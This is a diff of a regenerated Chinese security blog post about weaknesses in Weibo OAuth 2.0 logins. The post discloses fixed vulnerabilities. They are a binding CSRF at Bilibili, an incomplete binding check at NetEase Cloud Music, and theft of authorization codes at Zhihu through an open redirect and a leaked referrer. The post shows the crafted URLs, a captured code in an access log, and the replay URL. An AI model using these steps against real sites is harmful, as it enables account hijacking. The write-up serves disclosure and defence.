@@ -66,7 +66,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="OAuth 2.0,安全," />
+  <meta name="keywords" content="安全,OAuth 2.0," />
 
 
 
@@ -84,25 +84,18 @@
 
 
 
-<meta name="description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。
-新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。
-
-用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
+<meta name="description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。 新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。  用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
+<meta name="keywords" content="安全,OAuth 2.0">
 <meta property="og:type" content="article">
 <meta property="og:title" content="“脆弱”的微博OAuth 2.0">
 <meta property="og:url" content="http://zhchbin.github.io/2016/02/16/The-Weakness-of-Weibo-OAuth2-0/index.html">
 <meta property="og:site_name" content="zhchbin">
-<meta property="og:description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。
-新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。
-
-用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
+<meta property="og:description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。 新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。  用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2016-10-02T05:43:40.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="“脆弱”的微博OAuth 2.0">
-<meta name="twitter:description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。
-新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。
-
-用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
-
+<meta name="twitter:description" content="前言这篇文章将介绍WEB网站在接入第三方账号系统：新浪微博进行用户身份验证登录时会遇到的几个问题。前段时间我在乌云上报了几个与这方面相关的漏洞，后面的内容会有实际的例子进行说明，不过存在的问题都已经得到修复。 新浪微博的OAuth 2.0接下来以开发者的角度来描述一下登录的过程。  用户通过浏览器访问Web网站并通过希望通过新浪微博进行登录，我们需要将其引导到以下的页面：https://api.w">
 
 
 
@@ -325,14 +318,14 @@
 <li>后台通过这个接口就可以拿到用户的授权码，使用这个code，我们就可以在后台通过新浪提供的API：<code>https://api.weibo.com/oauth2/access_token?client_id=YOUR_CLIENT_ID&amp;client_secret=YOUR_CLIENT_SECRET&amp;grant_type=authorization_code&amp;redirect_uri=YOUR_REGISTERED_REDIRECT_URI&amp;code=CODE</code>，获取访问用户资源的Access Token，从而使用用户的身份完成一些授权的操作，如获取微博的账号信息。</li>
 </ol>
 <p>而在一些网站应用中，也允许用户的账号去绑定新浪微博的账号，然后就可以通过新浪微博进行登录，例如知乎，其绑定账号的过程也是类似上面的流程。</p>
-<p>相关链接：<a href="http://open.weibo.com/wiki/%E6%8E%88%E6%9D%83%E6%9C%BA%E5%88%B6%E8%AF%B4%E6%98%8E" target="_blank" rel="external">Web网站的授权</a></p>
-<h2 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h2><h3 id="0x00-绑定接口的CSRF"><a href="#0x00-绑定接口的CSRF" class="headerlink" title="0x00 绑定接口的CSRF"></a>0x00 绑定接口的CSRF</h3><p>案例：<a href="http://wooyun.org/bugs/wooyun-2016-0169000" target="_blank" rel="external">点我的链接我就可能会进入你的B站账号</a></p>
-<p>首先得感谢一下<a href="http://wooyun.org/whitehats/%E5%91%86%E5%AD%90%E4%B8%8D%E5%BC%80%E5%8F%A3" target="_blank" rel="external">@呆子不开口</a>，这个姿势是从他那里学习来的。用一句话总结一下：发起绑定第三方账号的接口存在CSRF问题，导致用户点击攻击者构造的页面后，攻击者的微博就绑定到了用户的账号下，从而造成攻击者能以受害用户的身份登录网站。接下来我将以B站之前存在的漏洞来说明构造攻击页面的过程。</p>
+<p>相关链接：<a href="http://open.weibo.com/wiki/%E6%8E%88%E6%9D%83%E6%9C%BA%E5%88%B6%E8%AF%B4%E6%98%8E" target="_blank" rel="noopener">Web网站的授权</a></p>
+<h2 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h2><h3 id="0x00-绑定接口的CSRF"><a href="#0x00-绑定接口的CSRF" class="headerlink" title="0x00 绑定接口的CSRF"></a>0x00 绑定接口的CSRF</h3><p>案例：<a href="http://wooyun.org/bugs/wooyun-2016-0169000" target="_blank" rel="noopener">点我的链接我就可能会进入你的B站账号</a></p>
+<p>首先得感谢一下<a href="http://wooyun.org/whitehats/%E5%91%86%E5%AD%90%E4%B8%8D%E5%BC%80%E5%8F%A3" target="_blank" rel="noopener">@呆子不开口</a>，这个姿势是从他那里学习来的。用一句话总结一下：发起绑定第三方账号的接口存在CSRF问题，导致用户点击攻击者构造的页面后，攻击者的微博就绑定到了用户的账号下，从而造成攻击者能以受害用户的身份登录网站。接下来我将以B站之前存在的漏洞来说明构造攻击页面的过程。</p>
 <ol>
 <li>在攻击页面中，用户点击页后，我们要先在用户的浏览器上登录指定的微博账号。注意该账号要先授权给bilibili，因为新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过bilibili，那么就会自动跳过前面的授权步骤直接完成绑定。登录微博的过程我用的方式比较简单粗暴，使用的是<code>http://weibo.cn</code>的登录接口。注：当时这个接口不需要验证码，现已加上，所以也就不存在登录CSRF的问题了。</li>
 <li>登录微博完成后，我们利用js在页面中插入一个<code>img</code>标签，指定src为<code>https://account.bilibili.com/login?sns=weibo</code>，加载完成后，我们的微博账号就绑定到了用户的账号中。</li>
 </ol>
-<h3 id="0x01-没有完整验证绑定流程"><a href="#0x01-没有完整验证绑定流程" class="headerlink" title="0x01 没有完整验证绑定流程"></a>0x01 没有完整验证绑定流程</h3><p>案例：<a href="http://wooyun.org/bugs/wooyun-2016-0170272" target="_blank" rel="external">点我的链接我就可能会进入你的网易云音乐</a></p>
+<h3 id="0x01-没有完整验证绑定流程"><a href="#0x01-没有完整验证绑定流程" class="headerlink" title="0x01 没有完整验证绑定流程"></a>0x01 没有完整验证绑定流程</h3><p>案例：<a href="http://wooyun.org/bugs/wooyun-2016-0170272" target="_blank" rel="noopener">点我的链接我就可能会进入你的网易云音乐</a></p>
 <p>网易云音乐的绑定微博账号流程如下：</p>
 <ol>
 <li>GET <code>http://music.163.com/api/sns/authorize?callbackType=Binding&amp;clientType=web2&amp;forcelogin=true&amp;snsType=2&amp;csrf_token=d0728eed66ae5189b66579d943559dc4</code></li>
@@ -350,18 +343,18 @@
 <li>攻击者利用自己的微博账号即可登录受害者的网易云音乐的账号</li>
 </ol>
 <h3 id="0x02-用户授权code被盗"><a href="#0x02-用户授权code被盗" class="headerlink" title="0x02 用户授权code被盗"></a>0x02 用户授权code被盗</h3><p>先说一下效果，用户在微博点击我构造好的URL之后，我就可以骗到该用户的授权code，利用这个code我们就可以以用户的身份登录其授权过的某些网站。至于要怎么做到，后面我用知乎的例子来说明吧，目前也修复了。</p>
-<p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0174018" target="_blank" rel="external">微博上你点我链接我就上你绑定过的知乎账号</a>和<a href="http://wooyun.org/bugs/wooyun-2016-0175030" target="_blank" rel="external">微博上你点我链接我就上你绑定过的网易通行证（涉及考拉海购/BOBO/同城约会等）</a> </p>
-<p>在知乎上，页面中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的<a href="https://www.zhihu.com/question/37062603/answer/71139922" target="_blank" rel="external">答案</a>中 ，里面的URL都是类似这样子的<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">https</span>://link.zhihu.com/?target=<span class="keyword">http</span>%<span class="number">3</span><span class="comment">A//www.wooyun.org/whitehats/zhchbin</span></span><br></pre></td></tr></table></figure></p>
-<p>这个URL能够跳转到任意的网址，且不需要用户确认！我们可以利用这个问题来做什么的？接下来就看我一步步构造一个恶意的URL。上面的接口是HTTPS的，而我的网站只支持HTTP，为了从<code>referrer</code>偷到用户的code信息，所以我先试了一下http是否可以，发现是没问题的。课外知识：<a href="http://serverfault.com/questions/520244/referer-is-passed-from-https-to-http-in-some-cases-how" target="_blank" rel="external">关于https -&gt; http 跳转的referrer</a></p>
+<p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0174018" target="_blank" rel="noopener">微博上你点我链接我就上你绑定过的知乎账号</a>和<a href="http://wooyun.org/bugs/wooyun-2016-0175030" target="_blank" rel="noopener">微博上你点我链接我就上你绑定过的网易通行证（涉及考拉海购/BOBO/同城约会等）</a> </p>
+<p>在知乎上，页面中的URL链接都是使用了一个接口进行跳转的，例如我在知乎上不要脸地回答了一个问题的<a href="https://www.zhihu.com/question/37062603/answer/71139922" target="_blank" rel="noopener">答案</a>中 ，里面的URL都是类似这样子的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://link.zhihu.com/?target=http%3A//www.wooyun.org/whitehats/zhchbin</span><br></pre></td></tr></table></figure></p>
+<p>这个URL能够跳转到任意的网址，且不需要用户确认！我们可以利用这个问题来做什么的？接下来就看我一步步构造一个恶意的URL。上面的接口是HTTPS的，而我的网站只支持HTTP，为了从<code>referrer</code>偷到用户的code信息，所以我先试了一下http是否可以，发现是没问题的。课外知识：<a href="http://serverfault.com/questions/520244/referer-is-passed-from-https-to-http-in-some-cases-how" target="_blank" rel="noopener">关于https -&gt; http 跳转的referrer</a></p>
 <p>NEXT：知乎登录页面中的微博登录是跳转到如下的URL：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//api.weibo.com/oauth2/authorize?</span></span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=https%<span class="number">3</span>A%<span class="number">2F</span>%<span class="number">2F</span>www.zhihu.com%<span class="number">2F</span>oauth%<span class="number">2F</span>callback%<span class="number">2F</span>login%<span class="number">2F</span>sina&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=<span class="number">3063806388</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?</span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=https%3A%2F%2Fwww.zhihu.com%2Foauth%2Fcallback%2Flogin%2Fsina&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=3063806388</span><br></pre></td></tr></table></figure>
 <p>由之前的基础知识我们可以知道，要想拿到code，就得利用<code>redirect_uri</code>参数跳转到我们自己的网站。但是这里有个域名的限制，如果你把redirect_uri直接改成其他网站，微博是会报<code>(error:redirect_uri_mismatch)</code>错误的，所以我们只能使用知乎下的域名。经测试：在接入微博登录的过程中，微博开放平台会要求验证域名是否属于我们。如果填入的域名是xxx.com，则该域名和其子域名下的任何接口都能与<code>client_id</code>匹配而不会报错。而测试后我猜测知乎用的域名是<code>zhihu.com</code>，所以<code>link.zhihu.com</code>也能与client_id匹配。所以利用上面的接口，构造出以下的URL：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//api.weibo.com/oauth2/authorize?</span></span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=http%<span class="number">3</span>A%<span class="number">2F</span>%<span class="number">2F</span>link.zhihu.com%<span class="number">2F</span>%<span class="number">3F</span>target%<span class="number">3</span>Dhttp%<span class="number">3</span>A%<span class="number">2F</span>%<span class="number">2F</span>a.zhchbin.xyz%<span class="number">2F</span>auth%<span class="number">3F</span>&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=<span class="number">3063806388</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?</span><br><span class="line">scope=email&amp;</span><br><span class="line">state=e9887b485320b0cab80b0d029e92759f&amp;</span><br><span class="line">redirect_uri=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%3A%2F%2Fa.zhchbin.xyz%2Fauth%3F&amp;</span><br><span class="line">response_type=code&amp;</span><br><span class="line">client_id=3063806388</span><br></pre></td></tr></table></figure>
 <p>一个在授权过知乎的微博用户点击上面的URL后，新浪微博就会加上code参数并自动跳转到redirect_uri参数指定的URL。微博这样便利的默认行为，在这里帮了大忙。如果伪装的好，用户点了链接之后会根本就不知道发生了什么事情。</p>
-<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;<span class="keyword">state</span>=e9887b485320b0cab80b0d029e92759f&amp;code=<span class="number">776</span>b93bbf6b2474067f593d743f36380</span><br></pre></td></tr></table></figure>
-<p>NEXT：上面的URL页面会使用JS调整到target参数中，这个时候我们查看一下auth接口的referrer，就可以找到用户的code，例如：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[31/Jan/2016:15:28:31 +0800]</span> <span class="string">"<span class="keyword">GET</span> /auth? HTTP/1.1"</span> <span class="number">404</span> <span class="number">402</span> <span class="string">"http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=ad3d1b20385f891a36e498cb470146e5"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36"</span> <span class="string">"2.94"</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=776b93bbf6b2474067f593d743f36380</span><br></pre></td></tr></table></figure>
+<p>NEXT：上面的URL页面会使用JS调整到target参数中，这个时候我们查看一下auth接口的referrer，就可以找到用户的code，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[31/Jan/2016:15:28:31 +0800] &quot;GET /auth? HTTP/1.1&quot; 404 402 &quot;http://link.zhihu.com/?target=http://a.zhchbin.xyz/auth?&amp;state=e9887b485320b0cab80b0d029e92759f&amp;code=ad3d1b20385f891a36e498cb470146e5&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36&quot; &quot;2.94&quot;</span><br></pre></td></tr></table></figure></p>
 <p>拿到这个code参数之后，在我们自己的浏览器中打开下面的链接，就可以以受害用户的身份来登录知乎了</p>
-<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.zhihu.com/oauth/callback/login/sina?</span><br><span class="line">state=<span class="number">17324074</span>ce<span class="number">785e62960</span>61cf<span class="number">1381f6f8</span>b&amp;</span><br><span class="line">code=ad<span class="number">3d1b20385</span>f<span class="number">891a36e49</span>8cb<span class="number">470146e5</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.zhihu.com/oauth/callback/login/sina?</span><br><span class="line">state=17324074ce785e6296061cf1381f6f8b&amp;</span><br><span class="line">code=ad3d1b20385f891a36e498cb470146e5</span><br></pre></td></tr></table></figure>
 <p>其中state参数的值是知乎首页的cookie中_xsrf对应的值。目前知乎已经修复这个问题，具体的修复方式就没有认真研究，我觉得最好的方式是在URL跳转前加一个安全提示，让用户确认的。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以发现OAuth2.0整个过程中都有不少容易被忽略的点，这里总结一下我认为的要写好第三方通信证登录及账号绑定需要注意的事情：</p>
 <ol>
@@ -372,10 +365,10 @@
 <p>PS：我书读得少，脑子不好使，以上内容如有错误，请和谐点指出。</p>
 <p>最后还是要放几个链接：</p>
 <ul>
-<li><a href="http://drops.wooyun.org/web/12695" target="_blank" rel="external">http://drops.wooyun.org/web/12695</a></li>
-<li><a href="http://weibo.com/p/1001603921767675649900?from=page_100505_profile&amp;wvr=6&amp;mod=wenzhangmod" target="_blank" rel="external">http://weibo.com/p/1001603921767675649900?from=page_100505_profile&amp;wvr=6&amp;mod=wenzhangmod</a></li>
-<li><a href="https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt" target="_blank" rel="external">https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt</a></li>
-<li><a href="http://drops.wooyun.org/papers/598" target="_blank" rel="external">http://drops.wooyun.org/papers/598</a></li>
+<li><a href="http://drops.wooyun.org/web/12695" target="_blank" rel="noopener">http://drops.wooyun.org/web/12695</a></li>
+<li><a href="http://weibo.com/p/1001603921767675649900?from=page_100505_profile&amp;wvr=6&amp;mod=wenzhangmod" target="_blank" rel="noopener">http://weibo.com/p/1001603921767675649900?from=page_100505_profile&amp;wvr=6&amp;mod=wenzhangmod</a></li>
+<li><a href="https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt" target="_blank" rel="noopener">https://github.com/knownsec/KCon/blob/master/KCon%20V3/%E5%88%A9%E7%94%A8OAuth%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD.ppt</a></li>
+<li><a href="http://drops.wooyun.org/papers/598" target="_blank" rel="noopener">http://drops.wooyun.org/papers/598</a></li>
 </ul>
 
       
@@ -399,9 +392,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/OAuth-2-0/" rel="tag">#OAuth 2.0</a>
-          
             <a href="/tags/安全/" rel="tag">#安全</a>
+          
+            <a href="/tags/OAuth-2-0/" rel="tag">#OAuth 2.0</a>
           
         </div>
       
@@ -600,7 +593,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#新浪微博的OAuth-2-0"><span class="nav-number">2.</span> <span class="nav-text">新浪微博的OAuth 2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各种姿势"><span class="nav-number">3.</span> <span class="nav-text">各种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-绑定接口的CSRF"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 绑定接口的CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-没有完整验证绑定流程"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 没有完整验证绑定流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-用户授权code被盗"><span class="nav-number">3.3.</span> <span class="nav-text">0x02 用户授权code被盗</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#新浪微博的OAuth-2-0"><span class="nav-number">2.</span> <span class="nav-text"><a href="#&#x65B0;&#x6D6A;&#x5FAE;&#x535A;&#x7684;OAuth-2-0" class="headerlink" title="&#x65B0;&#x6D6A;&#x5FAE;&#x535A;&#x7684;OAuth 2.0"></a>&#x65B0;&#x6D6A;&#x5FAE;&#x535A;&#x7684;OAuth 2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各种姿势"><span class="nav-number">3.</span> <span class="nav-text"><a href="#&#x5404;&#x79CD;&#x59FF;&#x52BF;" class="headerlink" title="&#x5404;&#x79CD;&#x59FF;&#x52BF;"></a>&#x5404;&#x79CD;&#x59FF;&#x52BF;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-绑定接口的CSRF"><span class="nav-number">3.1.</span> <span class="nav-text"><a href="#0x00-&#x7ED1;&#x5B9A;&#x63A5;&#x53E3;&#x7684;CSRF" class="headerlink" title="0x00 &#x7ED1;&#x5B9A;&#x63A5;&#x53E3;&#x7684;CSRF"></a>0x00 &#x7ED1;&#x5B9A;&#x63A5;&#x53E3;&#x7684;CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-没有完整验证绑定流程"><span class="nav-number">3.2.</span> <span class="nav-text"><a href="#0x01-&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x9A8C;&#x8BC1;&#x7ED1;&#x5B9A;&#x6D41;&#x7A0B;" class="headerlink" title="0x01 &#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x9A8C;&#x8BC1;&#x7ED1;&#x5B9A;&#x6D41;&#x7A0B;"></a>0x01 &#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x9A8C;&#x8BC1;&#x7ED1;&#x5B9A;&#x6D41;&#x7A0B;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-用户授权code被盗"><span class="nav-number">3.3.</span> <span class="nav-text"><a href="#0x02-&#x7528;&#x6237;&#x6388;&#x6743;code&#x88AB;&#x76D7;" class="headerlink" title="0x02 &#x7528;&#x6237;&#x6388;&#x6743;code&#x88AB;&#x76D7;"></a>0x02 &#x7528;&#x6237;&#x6388;&#x6743;code&#x88AB;&#x76D7;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</span></a></li></ol></div>
             
           </div>
         </section>
@@ -619,7 +612,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
